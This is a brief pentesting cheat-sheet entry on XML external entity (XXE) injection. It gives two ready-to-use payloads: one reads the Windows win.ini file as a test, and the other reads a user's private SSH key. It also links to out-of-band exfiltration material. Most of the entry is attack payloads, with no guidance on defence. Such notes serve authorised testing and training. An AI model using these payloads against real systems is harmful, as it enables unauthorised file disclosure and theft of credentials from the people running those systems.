## XXE / XEE

https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity

Sample payload for testing whether it's possible

```bash
<?xml version = "1.0"?>
<!DOCTYPE root [<!ENTITY toreplace SYSTEM 'file:///c:/windows/win.ini'> ]>
<order>
    <quantity>1234</quantity>
    <item>&toreplace;</item>
    <address>1234533453</address>
</order>
```

## Common attack vectors

```bash
<?xml version = "1.0"?>
<!DOCTYPE root [<!ENTITY toreplace SYSTEM 'file:///c:/users/dave/.ssh/id_rsa'> ]>
<order>
    <quantity>1234</quantity>
    <item>&toreplace;</item>
    <address>1234533453</address>
</order>
```

## Out-of-band exfiltration

[Example of OOB-exfiltration using FTP](https://gosecure.github.io/xxe-workshop/#3)

[Mock FTP server for FP-based OOB-exfiltration](https://github.com/GoSecure/xxe-workshop/blob/master/22_dtd_xxe/solution/ftp_server.rb)